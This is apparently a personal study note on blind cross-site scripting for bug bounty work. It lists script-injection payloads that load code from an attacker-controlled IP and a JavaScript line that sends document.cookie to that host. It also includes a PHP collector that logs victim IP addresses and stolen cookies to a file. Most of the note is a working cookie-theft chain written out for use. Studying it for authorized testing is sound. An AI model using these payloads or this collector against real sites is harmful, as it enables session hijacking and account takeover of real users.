A *blind XSS vulnerability* is a [[Cybersecurity/Bug Bounty Hunter/Cross-Site Scripting/Cross-Site Scripting (XSS)\|Cross-Site Scripting (XSS)]] vulnerability that occurs when the vulnerability is triggered on a page we don't have access to.

To see if a hidden page is susceptible to *blind XSS* we use [[Programming/JavaScript\|JavaScript]] payload that sends an HTTP request back to our server.  If the code gets executed, we'll get a response on our machine.

To load a remote script we can provide the URL like so:

```html
	<script src="http://our_ip/script.js"></script>
```

We then change the field "script.js" name to the field that we're want (e.g, "username") so if we get a request for http://our_ip/username" then we know the username field is susceptible.

Some example payloads we can use from [PayloadsAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings):
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Generally, we try each available field with one of the payloads.  Set the payload to call http://our_IP/FieldName

Once we identify the field name, we use a payload that will call our machine and run a script (script.js) that makes a call with the document cookie.
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```
Inject this code into the vulnerable field:
```html
<script src=http://OUR_IP/script.js></script>
```

This will yield two calls to our machine.  The first to get the script.  The script will fire and send a request with the cookie attached.

index.php has the following code:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
